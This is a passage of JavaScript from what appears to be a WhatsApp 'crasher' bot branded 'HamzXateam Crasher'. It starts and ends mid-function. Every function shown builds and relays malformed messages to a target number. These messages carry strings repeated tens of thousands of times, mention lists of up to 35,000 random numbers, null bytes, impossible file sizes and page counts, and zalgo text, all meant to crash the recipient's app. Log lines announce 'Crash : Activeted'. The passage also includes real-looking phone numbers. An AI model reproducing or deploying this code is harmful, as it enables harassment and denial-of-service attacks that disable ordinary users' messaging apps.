                  text: " '  ᄃΛᄂIƧƬΛᄃЯΛƧΉ'\n" + gg,
                  previewType: "ᄃΛᄂIƧƬΛᄃЯΛƧΉ",
                  contextInfo: {
                    mentionedJid: ["916909137213@s.whatsapp.net", "916909137213@s.whatsapp.net"]
                  }
                }
              }
            }
          }, {
            participant: {
              jid: X
            }
          });
          await hamz.relayMessage(X, {
            viewOnceMessage: {
              message: {
                interactiveMessage: {
                  body: {
                    text: "akujelek?"
                  },
                  footer: {
                    text: ""
                  },
                  header: {
                    documentMessage: {
                      url: "https://mmg.whatsapp.net/v/t62.7119-24/19973861_773172578120912_2263905544378759363_n.enc?ccb=11-4&oh=01_Q5AaIMqFI6NpAOoKBsWqUR52hN9p5YIGxW1TyJcHyVIb17Pe&oe=6653504B&_nc_sid=5e03e0&mms3=true",
                      mimetype: "application/pdf",
                      fileSha256: "oV/EME/ku/CjRSAFaW+b67CCFe6G5VTAGsIoimwxMR8=",
                      fileLength: null,
                      pageCount: 99999999999999,
                      contactVcard: true,
                      caption: "ᄃΛᄂIƧƬΛᄃЯΛƧΉ",
                      mediaKey: "yU8ofp6ZmGyLRdGteF7Udx0JE4dXbWvhT6X6Xioymeg=",
                      fileName: "ᄃΛᄂIƧƬΛᄃЯΛƧΉ ",
                      fileEncSha256: "0dJ3YssZD1YUMm8LdWPWxz2VNzw5icWNObWWiY9Zs3k=",
                      directPath: "/v/t62.7119-24/19973861_773172578120912_2263905544378759363_n.enc?ccb=11-4&oh=01_Q5AaIMqFI6NpAOoKBsWqUR52hN9p5YIGxW1TyJcHyVIb17Pe&oe=6653504B&_nc_sid=5e03e0",
                      mediaKeyTimestamp: "1714145232",
                      thumbnailDirectPath: "/v/t62.36145-24/32182773_798270155158347_7279231160763865339_n.enc?ccb=11-4&oh=01_Q5AaIGDA9WE26BzZF37Vp6aAsKq56VhpiK6Gdp2EGu1AoGd8&oe=665346DE&_nc_sid=5e03e0",
                      thumbnailSha256: "oFogyS+qrsnHwWFPNBmtCsNya8BJkTlG1mU3DdGfyjg=",
                      thumbnailEncSha256: "G2VHGFcbMP1IYd95tLWnpQRxCb9+Q/7/OaiDgvWY8bM=",
                      jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABERERESERMVFRMaHBkcGiYjICAjJjoqLSotKjpYN0A3N0A3WE5fTUhNX06MbmJiboyiiIGIosWwsMX46/j///8BERERERIRExUVExocGRwaJiMgICMmOiotKi0qOlg3QDc3QDdYTl9NSE1fToxuYmJujKKIgYiixbCwxfjr+P/////CABEIACIAYAMBIgACEQEDEQH/xAAwAAACAwEBAAAAAAAAAAAAAAADBAACBQYBAQEBAQEBAAAAAAAAAAAAAAAAAQIDBP/aAAwDAQACEAMQAAAA5CpC5601s5+88/TJ01nBC6jmytPTAQuZhpxa2PQ0WjCP2T6LXLJR3Ma5WSIsDXtUZYkz2seRXNmSAY8m/PlhkUdZD//EAC4QAAIBAwIEBAQHAAAAAAAAAAECAAMRIRIxBCJBcQVRgbEQEzIzQmFygsHR4f/aAAgBAQABPwBKSsN4aZERmVVybZxecODVpEsCE2zmIhYgAZMbwjiQgbBNto9MqSCMwiUioJDehvaVBynIJ3xKPDki7Yv7StTC3IYdoLAjT/s0ltpSOhgSAR1BlTi7qUQTw/g3aolU4VTLzxLgg96yb9Yy2gJVgRLKgL1VtfZdyTKdXQrO246dB+UJJJJ3hRAoDWA84p+WRc3U9YANRmlT3nK9NdN9u1jKD1KeNTSsfnmzFiB5Eypw9ADUS4Hr/U1LT+1T9SPcmEaiWJ1N59BKrAcgNxfJ+BV25nNu8QlLE5WJj9J2mhTKTMjAX5SZTo0qYDsVJOxgalWauFtdeonE1NDW27ZEeqpz/F/ePUJHXuYfgxJqQfT6RPtfujE3pwdJQ5uDYNnB3nAABKlh+IzisvVh2hhg3n//xAAZEQACAwEAAAAAAAAAAAAAAAABIAACEWH/2gAIAQIBAT8AYDs16p//xAAfEQABAwQDAQAAAAAAAAAAAAABAAIRICExMgMSQoH/2gAIAQMBAT8ALRERdYpc6+sLrIREUenIa/AuXFH/2Q==",
                      thumbnailHeight: 172,
                      thumbnailWidth: 480
                    },
                    hasMediaAttachment: true
                  },
                  nativeFlowMessage: {
                    buttons: [{
                      name: "single_select",
                      buttonParamsJson: JSON.stringify({
                        title: "ᄃΛᄂIƧƬΛᄃЯΛƧΉ",
                        sections: [{
                          title: "",
                          rows: [{
                            title: "ᄃΛᄂIƧƬΛᄃЯΛƧΉ",
                            id: ".huii"
                          }]
                        }]
                      })
                    }]
                  },
                  contextInfo: {
                    mentionedJid: X,
                    mentions: X
                  },
                  disappearingMode: {
                    initiator: "INITIATED_BY_ME",
                    inviteLinkGroupTypeV2: "DEFAULT",
                    messageContextInfo: {
                      deviceListMetadata: {
                        senderTimestamp: "1678285396",
                        recipientKeyHash: "SV5H7wGIOXqPtg==",
                        recipientTimestamp: "1678496731",
                        deviceListMetadataVersion: 2
                      }
                    }
                  }
                }
              }
            }
          }, {
            participant: {
              jid: X
            }
          });
          await hamz.relayMessage(X, {
            viewOnceMessage: {
              message: {
                locationMessage: {
                  degreesLatitude: -21.980324912168495,
                  degreesLongitude: 24.549921490252018,
                  name: "ᄃΛᄂIƧƬΛᄃЯΛƧΉ" + ggg,
                  address: "",
                  jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgAPwMBIgACEQEDEQH/xAAwAAACAwEBAAAAAAAAAAAAAAADBAACBQEGAQADAQEAAAAAAAAAAAAAAAABAgMABP/aAAwDAQACEAMQAAAAz2QAZ/Q57OSj+gLlnhnQdIBnhbzugXQZXcL6CF2XcIhqctQY3oMPokgQo6ArA2ZsVnlYUvnMq3lF7UfDKToz7SneaszZLzraR84aSDD7Jn//xAAhEAACAgIDAAMBAQAAAAAAAAABAgADBBESITETIkFRgf/aAAgBAQABPwAX2A2Op9MOSj1cbE7mEgqxy8NhsvDH+9RF12YGnFTLamPg3MnFONYFDbE+1liLx9MzXNVVdan8gdgVI/DEzlYaY9xbQRuJZyE5zKT5Mhj+ATGrUXDZ6EznJs3+RuvDOz3MXJRfo8+Sv1HE+xjsP2WMEfce5XUrv2MnoI6EJB8laAnuVUdgxelj1lpkE89Q7iO0ABGx/olNROyRE2hituW9IZah2TOBI7E48PYnEJsSm3YG4AGE4lfJk2a0sZuTdxiCpIjAOkLlQBqUOS2ojagOxMonmDOXsJHHqIdtLqSdESisq2yI2otnGZP2oVoDPNiBSBvUqO9SwdQGan//xAAdEQADAQADAAMAAAAAAAAAAAAAAQIRECExMkGB/9oACAECAQE/AMlpMXejivs2kydawnr0pKkWkvHpDOitzoeMldIw1OWNaR5+8P5cf//EAB0RAAIDAAIDAAAAAAAAAAAAAAERAAIQAxIgMVH/2gAIAQMBAT8Acpx2tXsIdZHowNwaPBF4M+Z//9k="
                }
              }
            }
          }, {
            participant: {
              jid: X
            }
          });
          await hamz.relayMessage(X, {
            botInvokeMessage: {
              message: {
                messageContextInfo: {
                  deviceListMetadataVersion: 2,
                  deviceListMetadata: {}
                },
                interactiveMessage: {
                  nativeFlowMessage: {
                    buttons: [{
                      name: "payment_info",
                      buttonParamsJson: "{\"currency\":\"INR\",\"total_amount\":{\"value\":0,\"offset\":100},\"reference_id\":\"4PVSNK5RNNJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"pending\",\"subtotal\":{\"value\":0,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"name\":\"\",\"amount\":{\"value\":0,\"offset\":100},\"quantity\":0,\"sale_amount\":{\"value\":0,\"offset\":100}}]},\"payment_settings\":[{\"type\":\"pix_static_code\",\"pix_static_code\":{\"merchant_name\":\"🦄드림 가이 𝐇𝐚𝐦𝐳𝐗𝐚𝐭𝐞𝐚𝐦 𝐂𝐫𝐚𝐬𝐡𝐞𝐫;\",\"key\":\"🦄드림 가이 𝐇𝐚𝐦𝐳𝐗𝐚𝐭𝐞𝐚𝐦 𝐂𝐫𝐚𝐬𝐡𝐞𝐫\",\"key_type\":\"RANDOM\"}}]}"
                    }]
                  }
                }
              }
            }
          }, {
            participant: {
              jid: X
            }
          });
          await hamz.relayMessage(X, {
            viewOnceMessage: {
              message: {
                liveLocationMessage: {
                  degreesLatitude: 11111111,
                  degreesLongitude: -111111,
                  caption: "xeontex",
                  url: "https://" + ggg + ".com",
                  sequenceNumber: "1678556734042001",
                  jpegThumbnail: null,
                  expiration: 7776000,
                  ephemeralSettingTimestamp: "1677306667",
                  disappearingMode: {
                    initiator: "INITIATED_BY_ME",
                    inviteLinkGroupTypeV2: "DEFAULT",
                    messageContextInfo: {
                      deviceListMetadata: {
                        senderTimestamp: "1678285396",
                        recipientKeyHash: "SV5H7wGIOXqPtg==",
                        recipientTimestamp: "1678496731",
                        deviceListMetadataVersion: 2
                      }
                    }
                  },
                  contextInfo: {
                    mentionedJid: X,
                    mentions: X,
                    isForwarded: true,
                    fromMe: false,
                    participant: "0@s.whatsapp.net",
                    remoteJid: "0@s.whatsapp.net"
                  }
                }
              }
            }
          }, {
            participant: {
              jid: X
            }
          });
        }
        
        async function XeonButtNew(X, Ptcp = true) {
   await hamz.relayMessage(X, {
     ephemeralMessage: {
      message: {
       interactiveMessage: {
        header: {
         documentMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
          mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
          fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
          fileLength: "9999999999999",
          pageCount: 1316134911,
          mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
          fileName: "𝐇𝐚𝐦𝐳𝐗𝐚𝐭𝐞𝐚𝐦 ⿻ 𝐂𝐫𝐚𝐬𝐡𝐞𝐫⃟⃟⃟😈",
          fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
          directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
          mediaKeyTimestamp: "1726867151",
          contactVcard: true,
          jpegThumbnail: "",
         },
         hasMediaAttachment: true,
        },
        body: {
         text: "𝐇𝐚𝐦𝐳𝐗𝐚𝐭𝐞𝐚𝐦 ⿻ 𝐂𝐫𝐚𝐬𝐡𝐞𝐫⃟⃟⃟😈\n" + "@916909137213".repeat(17000),
        },
        nativeFlowMessage: {
         buttons: [{
           name: "cta_url",
           buttonParamsJson: "{ display_text: '𝐇𝐚𝐦𝐳𝐗𝐚𝐭𝐞𝐚𝐦 ⿻ 𝐂𝐫𝐚𝐬𝐡𝐞𝐫⃟⃟⃟😈', url: \"https://youtube.com/dgxeon\", merchant_url: \"https://youtube.com/dgxeon\" }",
          },
          {
           name: "call_permission_request",
           buttonParamsJson: "{}",
          },
         ],
         messageParamsJson: "{}",
        },
        contextInfo: {
         mentionedJid: ["916909137213@s.whatsapp.net", ...Array.from({
          length: 30000
         }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net")],
         forwardingScore: 1,
         isForwarded: true,
         fromMe: false,
         participant: "0@s.whatsapp.net",
         remoteJid: "status@broadcast",
         quotedMessage: {
          documentMessage: {
           url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
           mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
           fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
           fileLength: "9999999999999",
           pageCount: 1316134911,
           mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
           fileName: "𝐇𝐚𝐦𝐳𝐗𝐚𝐭𝐞𝐚𝐦 ⿻ 𝐂𝐫𝐚𝐬𝐡𝐞𝐫⃟⃟⃟😈",
           fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
           directPath: "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
           mediaKeyTimestamp: "1724474503",
           contactVcard: true,
           thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
           thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
           thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
           jpegThumbnail: "",
          },
         },
        },
       },
      },
     },
    },
    Ptcp ? {
     participant: {
      jid: X
     }
    } : {}
   );
  };

async function Location(target, Filx) {
var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
viewOnceMessage: {
message: {
  "liveLocationMessage": {
 "degreesLatitude": "p",
 "degreesLongitude": "p",
 "caption": `🎭AldzXVo  ⃢⃢⃢⃢⃟⃟`+"ꦾ".repeat(50000),
 "sequenceNumber": "0",
 "jpegThumbnail": ""
  }
  }
}
}), { userJid: target, quoted: Filx })
await hamz.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id })
}
async function TagWa(target, Ptcp = true) {
    const mentionedJid = [
        "0@s.whatsapp.net", 
        ...Array.from({ length: 15000 }, () => `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`)
    ];
    const contextInfo = {
        mentionedJid, stanzaId: "1234567890ABCDEF", participant: "0@s.whatsapp.net",
        quotedMessage: { callLogMesssage: { isVideo: true, callOutcome: "1", durationSecs: "0", callType: "REGULAR",
            participants: [{ jid: "0@s.whatsapp.net", callOutcome: "1" }] } },
        remoteJid: target, forwardingScore: 9999999, isForwarded: true,
        externalAdReply: { title: "", body: "", mediaType: "VIDEO", renderLargerThumbnail: true,
            thumbnail: `${image}`, sourceUrl: "https://www.instagram.com/WhatsApp" }
    };
    await hamz.relayMessage(target, { 
        extendedTextMessage: { 
            text: "𝐇𝐚𝐦𝐳𝐗𝐚𝐭𝐞𝐚𝐦 𝐂𝐫𝐚𝐡𝐬𝐞𝐫 -" + "@0".repeat(90000), 
            contextInfo 
        } 
    }, Ptcp ? { participant: { jid: target } } : {});
}
async function NewLetter(X) {
let virtex = "⃢⃢𝐇𝐚𝐦𝐳𝐗𝐚𝐭𝐞𝐚𝐦  ⿻ 𝐓𝐞𝐚𝐦 𝐕𝐢𝐫𝐳𝐨" + "ꦾ".repeat(50000);
let mentionedJidArray = Array.from({ length: 35000 }, () => 
        "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
    );
	var messageContent = generateWAMessageFromContent(X, proto.Message.fromObject({
				'viewOnceMessage': {
					'message': {
						"newsletterAdminInviteMessage": {
							"newsletterJid": `${idsal}`,
							"newsletterName": virtex,
							"jpegThumbnail": "",
							"caption": virtex,
							"inviteExpiration": Date.now() + 1814400000
						},
						contextInfo: {
                  mentionedJid: mentionedJidArray,
                  groupMentions: [{ groupJid: `${idsal}`, groupSubject: virtex }]
                    }
					}
				}
			}), {
				'userJid': X
			});
			await hamz.relayMessage(X, messageContent.message, {
				'participant': {
					'jid': X
				},
				'messageId': messageContent.key.id
		});
		console.log("𝐇𝐚𝐦𝐳𝐗𝐚𝐭𝐞𝐚𝐦 𝐂𝐫𝐚𝐬𝐡 : 𝐀𝐜𝐭𝐢𝐯𝐞𝐭𝐞𝐝")
}
async function NewLetter2(X) {
    let etc = generateWAMessageFromContent(X, proto.Message.fromObject({
           viewOnceMessage: {
               message: {
                   listResponseMessage: {
                       title: "⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢\0\0\0𝐈𝐭𝐬𝐌𝐞 𝐀𝐥𝐝𝐳𝐗𝐕𝐢𝐫𝐙𝐨\0\0\0⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢" + "\u0000" + "ꦾ".repeat(50000) + "@1".repeat(103000),
                       listType: 1,
                       singleSelectReply: {
                           selectedRowId: "id"
                       },
                       contextInfo: {
                       isForwarded: true,
                           forwardedNewsletterMessageInfo: {
                               newsletterJid: "1@newsletter",
                               serverMessageId: 1,
                               newsletterName: "⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢\0\0\0⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢\0\0\0⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢\0\0\0ꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾ\0\0\0ꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾ\0\0\0ꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾ\0\0\0🎭@+62 831-2263-5477🎭@+62 831-2263-5477🎭@+62 831-2263-5477🎭@+62 831-2263-5477🎭@+62 831-2263-5477🎭@+62 831-2263-5477🎭@+62 831-2263-5477🎭@+62 831-2263-5477🎭@+62 831-2263-5477🎭@+62 831-2263-5477🎭@+62 831-2263-5477🎭@+62 831-2263-5477🎭@+62 831-2263-5477🎭@+62 831-2263-5477🎭@+62 831-2263-5477🎭@+62 831-2263-5477"
                           }
                       },
                       description: "⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢\0\0\0⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢\0\0\0⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢\0\0\0ꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾ\0\0\0ꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾ\0\0\0ꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾ\0\0\0🎭@+62 831-2263-5477🎭@+62 831-2263-5477🎭@+62 831-2263-5477🎭@+62 831-2263-5477🎭@+62 831-2263-5477🎭@+62 831-2263-5477🎭@+62 831-2263-5477🎭@+62 831-2263-5477🎭@+62 831-2263-5477🎭@+62 831-2263-5477🎭@+62 831-2263-5477🎭@+62 831-2263-5477🎭@+62 831-2263-5477🎭@+62 831-2263-5477🎭@+62 831-2263-5477🎭@+62 831-2263-5477"
                   }
               }
           }
       }), 
       { userJid: X, quoted: qdocu }
    )
   await hamz.relayMessage(X, etc.message, { participant: { jid: X } })
   console.log("𝐇𝐚𝐦𝐳𝐗𝐚𝐭𝐞𝐚𝐦 𝐂𝐫𝐚𝐬𝐡 : 𝐀𝐜𝐭𝐢𝐯𝐞𝐭𝐞𝐝")
}    
    async function CrashPair(X, Ptcp = true) {
			await hamz.relayMessage(X, {
					viewOnceMessage: {
						message: {
								nativeFlowResponseMessage: {
									"status":true,
                           "criador":"VenomMods","resultado":"\n{\n\"type\":\"md\",\n\"ws\":{\n\"_events\":{\"CB:ib,,dirty\":[\"Array\"]},\n\"_eventsCount\":20,\n\"_maxListeners\":0,\n\"url\":\"wss://web.whatsapp.com/ws/chat\",\n\"config\":{\n\"version\":[\"Array\"],\n\"browser\":[\"Array\"],\n\"waWebSocketUrl\":\"wss://web.whatsapp.com/ws/chat\",\n\"connectTimeoutMs\":20000,\n\"keepAliveIntervalMs\":30000,\n\"logger\":{},\n\"printQRInTerminal\":false,\n\"emitOwnEvents\":true,\n\"defaultQueryTimeoutMs\":60000,\n\"customUploadHosts\":[],\n\"retryRequestDelayMs\":250,\n\"maxMsgRetryCount\":5,\n\"fireInitQueries\":true,\n\"auth\":{\"Object\":\"authData\"},\n\"markOnlineOnConnect\":true,\n\"syncFullHistory\":false,\n\"linkPreviewImageThumbnailWidth\":192,\n\"transactionOpts\":{\"Object\":\"transactionOptsData\"},\n\"generateHighQualityLinkPreview\":false,\n\"options\":{},\n\"appStateMacVerification\":{\"Object\":\"appStateMacData\"},\n\"mobile\":false\n}\n}\n}"
							}
						}
					}
				},
				Ptcp ? {
					participant: {
						jid: X
					}
				} : {}
			);
};
  async function Floc1(X, Ptcp = true) {
    await hamz.relayMessage(X, {
      ephemeralMessage: {
        message: {
          interactiveMessage: {
            header: {
              documentMessage: {
                url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
                mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                fileLength: "9999999999999",
                pageCount: 1316134911,
                mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
                fileName: "⭑̤▾ g͆͆𝐇𝐚𝐦𝐳𝐗𝐚𝐭𝐞𝐚𝐦 ⿻ 𝐓𝐞𝐚𝐦 𝐕𝐢𝐫𝐙𝐨̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆g̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆g̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆g̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆g̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆g҉ ͆҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ Crag̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺  ▾⭑̤",
                fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
                directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
                mediaKeyTimestamp: "1726867151",
                contactVcard: true
              },
              hasMediaAttachment: true
            },
            body: {
